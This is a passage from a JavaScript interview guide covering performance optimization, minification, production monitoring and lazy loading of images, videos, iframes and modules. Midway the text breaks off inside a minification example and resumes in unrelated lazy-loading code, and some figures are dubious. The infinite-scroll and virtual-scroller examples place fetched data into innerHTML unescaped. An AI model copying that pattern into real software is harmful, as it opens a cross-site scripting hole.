function createHandlers() {
    const largeData = new Array(1000000).fill('data');
    const length = largeData.length;  // Store only what's needed
    
    return {
        handler: () => console.log(length)
    };
}

// 3. Clear timers and intervals
let timerId = setInterval(() => {
    console.log('Running');
}, 1000);

// Clean up when done
clearInterval(timerId);
timerId = null;
```

### Efficient Data Structures

```javascript
// 1. Use Set for unique values and fast lookups
// Bad - array
const uniqueValues = [];
if (!uniqueValues.includes(value)) {
    uniqueValues.push(value);
}

// Good - Set (O(1) lookup)
const uniqueValues = new Set();
uniqueValues.add(value);  // Automatically handles uniqueness

// 2. Use Map for key-value pairs
// Bad - object
const cache = {};
cache[key] = value;

// Good - Map (better performance, any key type)
const cache = new Map();
cache.set(key, value);

// 3. Use appropriate data structure
// For frequent searches: Set or Map
// For ordered data: Array
// For key-value with object methods: Object
```

### Async Operations Optimization

```javascript
// 1. Parallel execution with Promise.all
// Bad - sequential
async function loadData() {
    const users = await fetchUsers();      // Wait
    const products = await fetchProducts(); // Then wait
    const orders = await fetchOrders();    // Then wait
    
    return { users, products, orders };
}

// Good - parallel
async function loadData() {
    const [users, products, orders] = await Promise.all([
        fetchUsers(),
        fetchProducts(),
        fetchOrders()
    ]);
    
    return { users, products, orders };
}

// 2. Use async/await efficiently
// Bad - unnecessary awaits
async function processItems(items) {
    for (const item of items) {
        await processItem(item);  // One at a time
    }
}

// Good - batch processing
async function processItems(items) {
    await Promise.all(items.map(item => processItem(item)));
}
```

### Code Splitting and Lazy Loading

```javascript
// 1. Dynamic imports
// Instead of importing everything at once
// import { hugeLibrary } from './huge-library.js';

// Load only when needed
async function useFeature() {
    const { hugeLibrary } = await import('./huge-library.js');
    hugeLibrary.doSomething();
}

// 2. Lazy load components
class App {
    async loadComponent(name) {
        const module = await import(`./components/${name}.js`);
        return module.default;
    }
    
    async showModal() {
        const Modal = await this.loadComponent('Modal');
        const modal = new Modal();
        modal.show();
    }
}

// 3. Conditional loading
if (user.isAdmin) {
    import('./admin-features.js').then(module => {
        module.initializeAdmin();
    });
}
```

### Loop Optimization

```javascript
// 1. Choose appropriate loop
// For simple iteration: for...of
for (const item of items) {
    process(item);
}

// For index needed: forEach
items.forEach((item, index) => {
    process(item, index);
});

// For transformation: map
const processed = items.map(item => transform(item));

// For filtering: filter
const filtered = items.filter(item => item.active);

// 2. Avoid unnecessary work
// Bad
items.forEach(item => {
    const result = expensiveOperation();  // Called for each item
    item.value = result;
});

// Good
const result = expensiveOperation();  // Called once
items.forEach(item => {
    item.value = result;
});

// 3. Early exit
// Bad
let found = null;
for (let i = 0; i < items.length; i++) {
    if (items[i].id === targetId) {
        found = items[i];
    }
}

// Good
let found = null;
for (let i = 0; i < items.length; i++) {
    if (items[i].id === targetId) {
        found = items[i];
        break;  // Exit early
    }
}

// Better
const found = items.find(item => item.id === targetId);
```

### String Concatenation

```javascript
// 1. Use template literals for readability
// Bad
const message = 'Hello ' + user.name + ', you have ' + user.notifications + ' notifications';

// Good
const message = `Hello ${user.name}, you have ${user.notifications} notifications`;

// 2. For many concatenations, use array join
// Bad
let html = '';
for (let i = 0; i < 1000; i++) {
    html += '<div>' + i + '</div>';
}

// Good
const parts = [];
for (let i = 0; i < 1000; i++) {
    parts.push(`<div>${i}</div>`);
}
const html = parts.join('');
```

### Object and Array Operations

```javascript
// 1. Object property access
// Fast
const value = obj.property;

// Slower
const value = obj['property'];

// 2. Array operations
// Use appropriate method
const numbers = [1, 2, 3, 4, 5];

// Find first match
const first = numbers.find(n => n > 2);  // Returns 3, stops searching

// Check if exists
const hasLarge = numbers.some(n => n > 10);  // Returns boolean, stops at first true

// Check if all match
const allPositive = numbers.every(n => n > 0);  // Stops at first false

// 3. Shallow copy optimization
// Bad - deep clone when not needed
const copy = JSON.parse(JSON.stringify(obj));

// Good - shallow copy sufficient
const copy = { ...obj };
const arrayCopy = [...array];
```

### Web Workers for Heavy Computation

```javascript
// Main thread
const worker = new Worker('worker.js');

// Send data to worker
worker.postMessage({ data: largeDataset, operation: 'process' });

// Receive results
worker.addEventListener('message', (e) => {
    console.log('Result from worker:', e.data);
    updateUI(e.data);
});

// worker.js
self.addEventListener('message', (e) => {
    const { data, operation } = e.data;
    
    // Perform heavy computation
    const result = performHeavyCalculation(data);
    
    // Send back to main thread
    self.postMessage(result);
});

function performHeavyCalculation(data) {
    // Complex processing that would block UI
    return data.map(item => /* expensive operation */);
}
```

### Memoization and Caching

```javascript
// 1. Simple memoization
function memoize(fn) {
    const cache = new Map();
    
    return function(...args) {
        const key = JSON.stringify(args);
        
        if (cache.has(key)) {
            return cache.get(key);
        }
        
        const result = fn.apply(this, args);
        cache.set(key, result);
        
        return result;
    };
}

// Usage
const expensiveFunction = memoize((n) => {
    console.log('Computing...');
    return n * n;
});

console.log(expensiveFunction(5));  // Computing... 25
console.log(expensiveFunction(5));  // 25 (from cache)

// 2. API response caching
class APICache {
    constructor(ttl = 60000) {  // Time to live: 1 minute
        this.cache = new Map();
        this.ttl = ttl;
    }
    
    async fetch(url) {
        const cached = this.cache.get(url);
        
        if (cached && Date.now() - cached.timestamp < this.ttl) {
            return cached.data;
        }
        
        const response = await fetch(url);
        const data = await response.json();
        
        this.cache.set(url, {
            data,
            timestamp: Date.now()
        });
        
        return data;
    }
}

const apiCache = new APICache();
const data = await apiCache.fetch('/api/users');
```

### Performance Monitoring

```javascript
// 1. Measure execution time
console.time('operation');
performOperation();
console.timeEnd('operation');  // operation: 145.32ms

// 2. Performance API
const start = performance.now();
performOperation();
const end = performance.now();
console.log(`Execution time: ${end - start}ms`);

// 3. Performance marks and measures
performance.mark('start-task');
performTask();
performance.mark('end-task');

performance.measure('task-duration', 'start-task', 'end-task');

const measure = performance.getEntriesByName('task-duration')[0];
console.log(`Task took: ${measure.duration}ms`);

// 4. Monitor long tasks
const observer = new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {
        console.log('Long task detected:', entry.duration);
    }
});

observer.observe({ entryTypes: ['longtask'] });
```

### Important Notes

- Profile before optimizing - measure actual bottlenecks
- Optimize critical paths first
- Consider trade-offs between performance and code readability
- Use browser DevTools Performance tab to identify issues
- Minimize DOM manipulation and batch updates
- Use appropriate data structures for your use case
- Implement lazy loading and code splitting for large applications
- Cache expensive computations and API responses
- Use Web Workers for CPU-intensive tasks
- Monitor performance in production

---

## 50. How does JavaScript minification and bundling contribute to performance?

Minification and bundling are build-time optimizations that reduce file size and improve load times.

### Minification

Minification removes unnecessary characters from code without changing functionality.

```javascript
// Original code (readable)
function calculateTotal(items) {
    let total = 0;
    
    for (let i = 0; i < items.length; i++) {
        total += items[i].price * items[i].quantity;
    }
    
    return total;
}

const cart = [
    { price: 10, quantity: 2 },
    { price: 15, quantity: 1 }
];

const totalPrice = calculateTotal(cart);
console.log('Total:', totalPrice);

// Minified version (optimized)
function calculateTotal(t){let l=0;for(let e=0;e<t.length;e++)l+=t[e].price*t[e].quantity;return l}const cart=[{price:10,quantity:2},{price:15,quantity:1}],totalPrice=calculateTotal(cart);console.log("Total:",totalPrice);

// Size reduction: ~70% smaller
```

### What Minification Removes

```javascript
// 1. Whitespace and newlines
// Before: 250 bytes
function greet(name) {
    return "Hello, " + name + "!";
}

// After: 45 bytes
function greet(name){return"Hello, "+name+"!"}

// 2. Comments
// Before
/**
 * Calculate the sum of two numbers
 * @param {number} a - First number
 * @param {number} b - Second number
 * @returns {number} Sum
 */
function add(a, b) {
    return a + b;  // Return sum
}

// After
function add(a,b){return a+b}

// 3. Unnecessary semicolons
// Before
const x = 5;
const y = 10;

// After
const x=5,y=10

// 4. Variable name shortening
// Before
function calculateUserAccountBalance(userAccountData) {
    const userAccountBalance = userAccountData.deposits - userAccountData.withdrawals;
    return userAccountBalance;
}

// After (with name mangling)
function c(a){const b=a.deposits-a.withdrawals;return b}
```

### Advanced Minification Techniques

```javascript
// 1. Dead code elimination
// Before
function processData(data) {
    if (false) {
        console.log('This never runs');
    }
    
    return data.map(item => item * 2);
}

// After minification
function processData(data){return data.map(item=>item*2)}

// 2. Constant folding
// Before
const result = 60 * 60 * 24 * 7;  // One week in seconds

// After
const result=604800;

// 3. Function inlining
// Before
function double(x) {
    return x * 2;
}

function calculate(a) {
    return double(a) + 10
img.removeAttribute('data-src');
                    imageObserver.unobserve(img);
                }
            });
        });
        
        images.forEach(img => imageObserver.observe(img));
    }
    
    initializeApp() {
        // Minimal initialization
        console.log('App initialized');
    }
}

// Initialize progressive loading
const loader = new ProgressiveLoader();
loader.loadCritical();
loader.deferNonCritical();
```

### Resource Hints

```javascript
// Use browser resource hints for better performance

// 1. DNS Prefetch
// Resolve DNS early for external domains
<link rel="dns-prefetch" href="//api.example.com">
<link rel="dns-prefetch" href="//cdn.example.com">

// 2. Preconnect
// Establish early connection (DNS + TCP + TLS)
<link rel="preconnect" href="https://api.example.com">

// 3. Prefetch
// Load resources likely needed for next navigation
<link rel="prefetch" href="/next-page.html">
<link rel="prefetch" href="/images/hero.jpg">

// 4. Preload
// Load critical resources with high priority
<link rel="preload" href="/fonts/main.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/critical.css" as="style">
<link rel="preload" href="/hero-image.jpg" as="image">

// 5. Programmatic resource hints
function addResourceHint(rel, href, as = null) {
    const link = document.createElement('link');
    link.rel = rel;
    link.href = href;
    if (as) link.as = as;
    document.head.appendChild(link);
}

// Preload next page resources when user hovers over link
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('mouseenter', () => {
        const href = link.getAttribute('href');
        addResourceHint('prefetch', href);
    });
});
```

### Monitoring Performance in Production

```javascript
// Comprehensive performance monitoring
class PerformanceMonitoringService {
    constructor(apiEndpoint) {
        this.apiEndpoint = apiEndpoint;
        this.metrics = {};
        this.init();
    }
    
    init() {
        // Monitor page load
        window.addEventListener('load', () => {
            this.collectLoadMetrics();
        });
        
        // Monitor Core Web Vitals
        this.observeLCP();
        this.observeFID();
        this.observeCLS();
        
        // Monitor resource loading
        this.observeResources();
        
        // Monitor long tasks
        this.observeLongTasks();
    }
    
    collectLoadMetrics() {
        const perfData = performance.timing;
        
        this.metrics.navigationTiming = {
            // Time to First Byte
            ttfb: perfData.responseStart - perfData.navigationStart,
            
            // DNS lookup
            dnsLookup: perfData.domainLookupEnd - perfData.domainLookupStart,
            
            // TCP connection
            tcpConnection: perfData.connectEnd - perfData.connectStart,
            
            // Request time
            requestTime: perfData.responseEnd - perfData.requestStart,
            
            // DOM processing
            domProcessing: perfData.domComplete - perfData.domLoading,
            
            // Total load time
            loadTime: perfData.loadEventEnd - perfData.navigationStart,
            
            // DOM Content Loaded
            domContentLoaded: perfData.domContentLoadedEventEnd - perfData.navigationStart
        };
        
        // Send metrics to server
        this.sendMetrics();
    }
    
    observeLCP() {
        const observer = new PerformanceObserver((list) => {
            const entries = list.getEntries();
            const lastEntry = entries[entries.length - 1];
            
            this.metrics.lcp = {
                value: lastEntry.renderTime || lastEntry.loadTime,
                element: lastEntry.element?.tagName,
                url: lastEntry.url,
                timestamp: Date.now()
            };
        });
        
        observer.observe({ entryTypes: ['largest-contentful-paint'] });
    }
    
    observeFID() {
        const observer = new PerformanceObserver((list) => {
            const entries = list.getEntries();
            
            entries.forEach(entry => {
                this.metrics.fid = {
                    value: entry.processingStart - entry.startTime,
                    name: entry.name,
                    timestamp: Date.now()
                };
                
                this.sendMetrics();
            });
        });
        
        observer.observe({ entryTypes: ['first-input'] });
    }
    
    observeCLS() {
        let clsScore = 0;
        
        const observer = new PerformanceObserver((list) => {
            for (const entry of list.getEntries()) {
                if (!entry.hadRecentInput) {
                    clsScore += entry.value;
                }
            }
            
            this.metrics.cls = {
                value: clsScore,
                timestamp: Date.now()
            };
        });
        
        observer.observe({ entryTypes: ['layout-shift'] });
        
        // Send CLS when user leaves page
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                this.sendMetrics();
            }
        });
    }
    
    observeResources() {
        const observer = new PerformanceObserver((list) => {
            const entries = list.getEntries();
            
            const slowResources = entries.filter(entry => {
                return entry.duration > 1000;  // Slower than 1 second
            });
            
            if (slowResources.length > 0) {
                this.metrics.slowResources = slowResources.map(entry => ({
                    name: entry.name,
                    duration: entry.duration,
                    size: entry.transferSize,
                    type: entry.initiatorType
                }));
                
                this.sendMetrics();
            }
        });
        
        observer.observe({ entryTypes: ['resource'] });
    }
    
    observeLongTasks() {
        if ('PerformanceObserver' in window) {
            const observer = new PerformanceObserver((list) => {
                const entries = list.getEntries();
                
                this.metrics.longTasks = entries.map(entry => ({
                    duration: entry.duration,
                    startTime: entry.startTime,
                    name: entry.name
                }));
                
                // Alert if long tasks detected
                if (entries.length > 0) {
                    console.warn(`${entries.length} long tasks detected`);
                    this.sendMetrics();
                }
            });
            
            try {
                observer.observe({ entryTypes: ['longtask'] });
            } catch (e) {
                // Long task API not supported
            }
        }
    }
    
    sendMetrics() {
        // Add context
        const data = {
            ...this.metrics,
            userAgent: navigator.userAgent,
            url: window.location.href,
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            connection: this.getConnectionInfo(),
            timestamp: Date.now()
        };
        
        // Use sendBeacon for reliability (won't be cancelled on page unload)
        if (navigator.sendBeacon) {
            navigator.sendBeacon(
                this.apiEndpoint,
                JSON.stringify(data)
            );
        } else {
            // Fallback to fetch
            fetch(this.apiEndpoint, {
                method: 'POST',
                body: JSON.stringify(data),
                keepalive: true
            }).catch(err => console.error('Failed to send metrics:', err));
        }
    }
    
    getConnectionInfo() {
        const connection = navigator.connection || 
                          navigator.mozConnection || 
                          navigator.webkitConnection;
        
        if (!connection) return null;
        
        return {
            effectiveType: connection.effectiveType,
            downlink: connection.downlink,
            rtt: connection.rtt,
            saveData: connection.saveData
        };
    }
}

// Initialize monitoring
const monitor = new PerformanceMonitoringService('/api/performance-metrics');
```

### A/B Testing Performance Impact

```javascript
// Test performance improvements
class PerformanceABTest {
    constructor() {
        this.variant = this.assignVariant();
    }
    
    assignVariant() {
        // 50/50 split
        return Math.random() < 0.5 ? 'control' : 'optimized';
    }
    
    applyVariant() {
        if (this.variant === 'optimized') {
            this.applyOptimizations();
        }
        
        // Track which variant user sees
        this.trackVariant();
    }
    
    applyOptimizations() {
        // Example: Lazy load images in optimized variant
        const images = document.querySelectorAll('img');
        images.forEach(img => {
            if (img.dataset.src) {
                img.loading = 'lazy';
            }
        });
        
        // Defer non-critical scripts
        const scripts = document.querySelectorAll('script[data-defer]');
        scripts.forEach(script => {
            script.defer = true;
        });
        
        console.log('Performance optimizations applied');
    }
    
    trackVariant() {
        // Track metrics for comparison
        window.addEventListener('load', () => {
            const loadTime = performance.timing.loadEventEnd - 
                           performance.timing.navigationStart;
            
            // Send to analytics
            fetch('/api/ab-test-metrics', {
                method: 'POST',
                body: JSON.stringify({
                    variant: this.variant,
                    loadTime: loadTime,
                    lcp: this.getLCP(),
                    fid: this.getFID(),
                    cls: this.getCLS()
                })
            });
        });
    }
    
    getLCP() {
        return new Promise((resolve) => {
            const observer = new PerformanceObserver((list) => {
                const entries = list.getEntries();
                const lastEntry = entries[entries.length - 1];
                resolve(lastEntry.renderTime || lastEntry.loadTime);
                observer.disconnect();
            });
            observer.observe({ entryTypes: ['largest-contentful-paint'] });
        });
    }
    
    getFID() {
        return new Promise((resolve) => {
            const observer = new PerformanceObserver((list) => {
                const entries = list.getEntries();
                const firstEntry = entries[0];
                resolve(firstEntry.processingStart - firstEntry.startTime);
                observer.disconnect();
            });
            observer.observe({ entryTypes: ['first-input'] });
        });
    }
    
    getCLS() {
        return new Promise((resolve) => {
            let clsScore = 0;
            const observer = new PerformanceObserver((list) => {
                for (const entry of list.getEntries()) {
                    if (!entry.hadRecentInput) {
                        clsScore += entry.value;
                    }
                }
            });
            observer.observe({ entryTypes: ['layout-shift'] });
            
            // Resolve after 5 seconds
            setTimeout(() => {
                resolve(clsScore);
                observer.disconnect();
            }, 5000);
        });
    }
}

// Run A/B test
const abTest = new PerformanceABTest();
abTest.applyVariant();
```

### Performance Checklist

```javascript
// Comprehensive performance audit checklist
const performanceChecklist = {
    // Loading Performance
    loading: {
        'Minimize HTTP requests': false,
        'Enable compression (Gzip/Brotli)': false,
        'Minify CSS, JavaScript, HTML': false,
        'Optimize images (WebP, proper sizing)': false,
        'Implement lazy loading': false,
        'Use CDN for static assets': false,
        'Enable browser caching': false,
        'Eliminate render-blocking resources': false,
        'Preload critical resources': false,
        'Code splitting implemented': false
    },
    
    // Runtime Performance
    runtime: {
        'Debounce/throttle event handlers': false,
        'Use virtual scrolling for long lists': false,
        'Optimize animations (use transform/opacity)': false,
        'Minimize DOM manipulation': false,
        'Use event delegation': false,
        'Avoid memory leaks': false,
        'Optimize loops and calculations': false,
        'Use Web Workers for heavy tasks': false
    },
    
    // Network Performance
    network: {
        'Minimize payload size': false,
        'Use HTTP/2 or HTTP/3': false,
        'Implement service workers': false,
        'Cache API responses': false,
        'Use connection hints (preconnect, dns-prefetch)': false,
        'Optimize third-party scripts': false
    },
    
    // Metrics & Monitoring
    monitoring: {
        'Track Core Web Vitals': false,
        'Set performance budgets': false,
        'Monitor real user metrics (RUM)': false,
        'Implement error tracking': false,
        'Regular performance audits': false
    }
};

// Audit function
function auditPerformance() {
    console.log('Running performance audit...');
    
    // Check each category
    Object.keys(performanceChecklist).forEach(category => {
        console.log(`\n${category.toUpperCase()}:`);
        
        Object.keys(performanceChecklist[category]).forEach(item => {
            const status = performanceChecklist[category][item] ? '✓' : '✗';
            console.log(`${status} ${item}`);
        });
    });
}
```

### Important Notes

- Page load time directly affects conversion rates and revenue
- Google uses page speed as a ranking factor for SEO
- Core Web Vitals (LCP, FID, CLS) are critical metrics
- Mobile performance is even more important due to slower networks
- Set and enforce performance budgets
- Monitor real user metrics, not just synthetic tests
- Every 100ms delay can decrease conversions by 1%
- 53% of mobile users abandon sites that take over 3 seconds to load
- Performance is not a one-time fix but continuous optimization
- Balance performance with functionality and user experience

---

## 52. Explain how lazy loading works in JavaScript.

Lazy loading defers loading of non-critical resources until they're needed, improving initial page load time.

### Image Lazy Loading

```javascript
// 1. Native lazy loading (modern browsers)
<img src="image.jpg" loading="lazy" alt="Description">

// Browser automatically loads image when near viewport

// 2. Intersection Observer API (custom implementation)
class LazyImageLoader {
    constructor(selector = 'img[data-src]') {
        this.images = document.querySelectorAll(selector);
        this.init();
    }
    
    init() {
        if ('IntersectionObserver' in window) {
            this.observeImages();
        } else {
            // Fallback: load all images immediately
            this.loadAllImages();
        }
    }
    
    observeImages() {
        const options = {
            root: null,  // viewport
            rootMargin: '50px',  // Load 50px before entering viewport
            threshold: 0.01  // Trigger when 1% visible
        };
        
        const observer = new IntersectionObserver((entries, observer) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.loadImage(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, options);
        
        this.images.forEach(img => observer.observe(img));
    }
    
    loadImage(img) {
        const src = img.dataset.src;
        const srcset = img.dataset.srcset;
        
        // Create new image to preload
        const tempImg = new Image();
        
        tempImg.onload = () => {
            img.src = src;
            if (srcset) {
                img.srcset = srcset;
            }
            img.classList.add('loaded');
            img.removeAttribute('data-src');
            img.removeAttribute('data-srcset');
        };
        
        tempImg.onerror = () => {
            console.error(`Failed to load image: ${src}`);
            img.classList.add('error');
        };
        
        tempImg.src = src;
    }
    
    loadAllImages() {
        this.images.forEach(img => this.loadImage(img));
    }
}

// Usage
const lazyLoader = new LazyImageLoader();
```

### HTML Structure for Lazy Images

```html
<!-- Lazy loaded image with placeholder -->
<img 
    src="placeholder.jpg" 
    data-src="full-image.jpg"
    data-srcset="image-320.jpg 320w, image-640.jpg 640w, image-1024.jpg 1024w"
    alt="Description"
    class="lazy-image"
>

<!-- With blur-up effect -->
<div class="image-wrapper">
    <img src="tiny-blur.jpg" class="placeholder" alt="Description">
    <img data-src="full-image.jpg" class="lazy-image" alt="Description">
</div>

<style>
.image-wrapper {
    position: relative;
}

.placeholder {
    filter: blur(10px);
    transition: opacity 0.3s;
}

.lazy-image.loaded + .placeholder {
    opacity: 0;
}
</style>
```

### Lazy Loading Background Images

```javascript
// Lazy load CSS background images
class LazyBackgroundLoader {
    constructor(selector = '.lazy-background') {
        this.elements = document.querySelectorAll(selector);
        this.init();
    }
    
    init() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.loadBackground(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, {
            rootMargin: '50px'
        });
        
        this.elements.forEach(el => observer.observe(el));
    }
    
    loadBackground(element) {
        const bg = element.dataset.bg;
        
        if (bg) {
            // Preload image
            const img = new Image();
            img.onload = () => {
                element.style.backgroundImage = `url(${bg})`;
                element.classList.add('loaded');
            };
            img.src = bg;
        }
    }
}

// Usage
const bgLoader = new LazyBackgroundLoader();
```

```html
<!-- HTML -->
<div 
    class="lazy-background hero" 
    data-bg="hero-image.jpg"
>
    <h1>Hero Content</h1>
</div>

<style>
.lazy-background {
    background-color: #f0f0f0;
    background-size: cover;
    background-position: center;
    transition: background-image 0.3s;
}
</style>
```

### Lazy Loading Videos

```javascript
// Lazy load video sources
class LazyVideoLoader {
    constructor(selector = 'video[data-src]') {
        this.videos = document.querySelectorAll(selector);
        this.init();
    }
    
    init() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.loadVideo(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, {
            rootMargin: '100px'
        });
        
        this.videos.forEach(video => observer.observe(video));
    }
    
    loadVideo(video) {
        const sources = video.querySelectorAll('source[data-src]');
        
        sources.forEach(source => {
            source.src = source.dataset.src;
            source.removeAttribute('data-src');
        });
        
        video.load();
        video.classList.add('loaded');
        
        // Autoplay if specified
        if (video.dataset.autoplay === 'true') {
            video.play().catch(err => {
                console.log('Autoplay prevented:', err);
            });
        }
    }
}

// Usage
const videoLoader = new LazyVideoLoader();
```

```html
<!-- HTML -->
<video 
    class="lazy-video" 
    data-src="video.mp4"
    data-autoplay="true"
    controls
    poster="poster.jpg"
>
    <source data-src="video.webm" type="video/webm">
    <source data-src="video.mp4" type="video/mp4">
    Your browser doesn't support video.
</video>
```

### Lazy Loading Iframes

```javascript
// Lazy load iframes (embeds, maps, etc.)
class LazyIframeLoader {
    constructor(selector = 'iframe[data-src]') {
        this.iframes = document.querySelectorAll(selector);
        this.init();
    }
    
    init() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.loadIframe(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, {
            rootMargin: '200px'  // Load earlier for better UX
        });
        
        this.iframes.forEach(iframe => observer.observe(iframe));
    }
    
    loadIframe(iframe) {
        iframe.src = iframe.dataset.src;
        iframe.removeAttribute('data-src');
        
        iframe.addEventListener('load', () => {
            iframe.classList.add('loaded');
        });
    }
}

// Usage
const iframeLoader = new LazyIframeLoader();
```

```html
<!-- YouTube video -->
<iframe
    data-src="https://www.youtube.com/embed/VIDEO_ID"
    width="560"
    height="315"
    frameborder="0"
    allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
    allowfullscreen
></iframe>

<!-- Google Maps -->
<iframe
    data-src="https://www.google.com/maps/embed?pb=..."
    width="600"
    height="450"
    frameborder="0"
    style="border:0"
    allowfullscreen
></iframe>
```

### Lazy Loading JavaScript Modules

```javascript
// 1. Dynamic import
async function loadFeature() {
    try {
        const module = await import('./feature.js');
        module.initializeFeature();
    } catch (error) {
        console.error('Failed to load feature:', error);
    }
}

// Load when button clicked
document.getElementById('loadFeatureBtn').addEventListener('click', loadFeature);

// 2. Route-based code splitting
class Router {
    constructor(routes) {
        this.routes = routes;
        this.init();
    }
    
    init() {
        window.addEventListener('popstate', () => {
            this.loadRoute(window.location.pathname);
        });
        
        // Handle link clicks
        document.addEventListener('click', (e) => {
            if (e.target.matches('a[data-route]')) {
                e.preventDefault();
                const path = e.target.getAttribute('href');
                this.navigate(path);
            }
        });
        
        // Load initial route
        this.loadRoute(window.location.pathname);
    }
    
    async loadRoute(path) {
        const route = this.routes[path];
        
        if (route) {
            try {
                const module = await import(route.component);
                const component = new module.default();
                component.render(document.getElementById('app'));
                
                // Update browser history
                if (window.location.pathname !== path) {
                    window.history.pushState({}, '', path);
                }
            } catch (error) {
                console.error(`Failed to load route ${path}:`, error);
                this.show404();
            }
        } else {
            this.show404();
        }
    }
    
    navigate(path) {
        this.loadRoute(path);
    }
    
    show404() {
        document.getElementById('app').innerHTML = '<h1>404 - Page Not Found</h1>';
    }
}

// Define routes
const routes = {
    '/': { component: './pages/Home.js' },
    '/about': { component: './pages/About.js' },
    '/products': { component: './pages/Products.js' },
    '/contact': { component: './pages/Contact.js' }
};

const router = new Router(routes);
```

### Lazy Loading CSS

```javascript
// Load CSS on demand
function loadCSS(href) {
    return new Promise((resolve, reject) => {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = href;
        
        link.onload = () => resolve();
        link.onerror = () => reject(new Error(`Failed to load CSS: ${href}`));
        
        document.head.appendChild(link);
    });
}

// Load theme CSS when user changes theme
async function changeTheme(themeName) {
    try {
        await loadCSS(`/css/themes/${themeName}.css`);
        console.log(`Theme ${themeName} loaded`);
    } catch (error) {
        console.error('Failed to load theme:', error);
    }
}

// Load print styles only when printing
window.addEventListener('beforeprint', async () => {
    await loadCSS('/css/print.css');
});
```

### Infinite Scroll with Lazy Loading

```javascript
// Infinite scroll implementation
class InfiniteScroll {
    constructor(options) {
        this.container = document.querySelector(options.container);
        this.loadMore = options.loadMore;
        this.threshold = options.threshold || 200;
        this.loading = false;
        this.page = 1;
        
        this.init();
    }
    
    init() {
        // Observe scroll
        window.addEventListener('scroll', () => {
            this.checkScroll();
        });
        
        // Initial load
        this.loadContent();
    }
    
    checkScroll() {
        if (this.loading) return;
        
        const scrollPosition = window.innerHeight + window.scrollY;
        const threshold = document.documentElement.scrollHeight - this.threshold;
        
        if (scrollPosition >= threshold) {
            this.loadContent();
        }
    }
    
    async loadContent() {
        this.loading = true;
        this.showLoadingIndicator();
        
        try {
            const data = await this.loadMore(this.page);
            
            if (data && data.length > 0) {
                this.renderItems(data);
                this.page++;
            } else {
                this.showEndMessage();
            }
        } catch (error) {
            console.error('Failed to load content:', error);
            this.showErrorMessage();
        } finally {
            this.loading = false;
            this.hideLoadingIndicator();
        }
    }
    
    renderItems(items) {
        items.forEach(item => {
            const element = this.createItemElement(item);
            this.container.appendChild(element);
        });
    }
    
    createItemElement(item) {
        const div = document.createElement('div');
        div.className = 'item';
        div.innerHTML = `
            <img data-src="${item.image}" class="lazy-image" alt="${item.title}">
            <h3>${item.title}</h3>
            <p>${item.description}</p>
        `;
        return div;
    }
    
    showLoadingIndicator() {
        const loader = document.createElement('div');
        loader.id = 'loading-indicator';
        loader.innerHTML = '<p>Loading...</p>';
        this.container.appendChild(loader);
    }
    
    hideLoadingIndicator() {
        const loader = document.getElementById('loading-indicator');
        if (loader) loader.remove();
    }
    
    showEndMessage() {
        const message = document.createElement('div');
        message.className = 'end-message';
        message.innerHTML = '<p>No more items to load</p>';
        this.container.appendChild(message);
    }
    
    showErrorMessage() {
        const message = document.createElement('div');
        message.className = 'error-message';
        message.innerHTML = '<p>Failed to load items. Please try again.</p>';
        this.container.appendChild(message);
    }
}

// Usage
const infiniteScroll = new InfiniteScroll({
    container: '#items-container',
    threshold: 300,
    loadMore: async (page) => {
        const response = await fetch(`/api/items?page=${page}`);
        return response.json();
    }
});
```

### Virtual Scrolling

```javascript
// Render only visible items for large lists
class VirtualScroller {
    constructor(options) {
        this.container = document.querySelector(options.container);
        this.items = options.items;
        this.itemHeight = options.itemHeight;
        this.renderItem = options.renderItem;
        this.visibleCount = Math.ceil(window.innerHeight / this.itemHeight) + 2;
        this.scrollTop = 0;
        
        this.init();
    }
    
    init() {
        // Create viewport
        this.viewport = document.createElement('div');
        this.viewport.style.height = `${this.items.length * this.itemHeight}px`;
        this.viewport.style.position = 'relative';
        this.container.appendChild(this.viewport);
        
        // Create content container
        this.content = document.createElement('div');
        this.content.style.position = 'absolute';
        this.content.style.top = '0';
        this.content.style.left = '0';
        this.content.style.right = '0';
        this.viewport.appendChild(this.content);
        
        // Listen to scroll
        this.container.addEventListener('scroll', () => {
            this.scrollTop = this.container.scrollTop;
            this.render();
        });
        
        // Initial render
        this.render();
    }
    
    render() {
        const startIndex = Math.floor(this.scrollTop / this.itemHeight);
        const endIndex = Math.min(
            startIndex + this.visibleCount,
            this.items.length
        );
        
        // Clear content
        this.content.innerHTML = '';
        
        // Set offset
        this.content.style.transform = `translateY(${startIndex * this.itemHeight}px)`;
        
        // Render visible items
        for (let i = startIndex; i < endIndex; i++) {
            const element = this.renderItem(this.items[i], i);
            element.style.height = `${this.itemHeight}px`;
            this.content.appendChild(element);
        }
    }
}

// Usage
const items = Array.from({ length: 10000 }, (_, i) => ({
    id: i,
    title: `Item ${i}`,
    description: `Description for item ${i}`
}));

const scroller = new VirtualScroller({
    container: '#list-container',
    items: items,
    itemHeight: 60,
    renderItem: (item, index) => {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <h4>${item.title}</h4>
            <p>${item.description}</p>
        `;
        return div;
    }
});
```

### Preloading Strategy

```javascript
// Intelligent preloading based on user behavior


class SmartPreloader {
    constructor() {
        this.preloadQueue = [];
        this.preloadedUrls = new Set();
        this.init();
    }
    
    init() {
        // Preload on hover
        this.initHoverPreload();
        
        // Preload visible links
        this.preloadVisibleLinks();
        
        // Preload on idle
        this.initIdlePreload();
    }
    
    // Preload when user hovers over link
    initHoverPreload() {
        document.addEventListener('mouseover', (e) => {
            const link = e.target.closest('a[href]');
            if (link && this.shouldPreload(link.href)) {
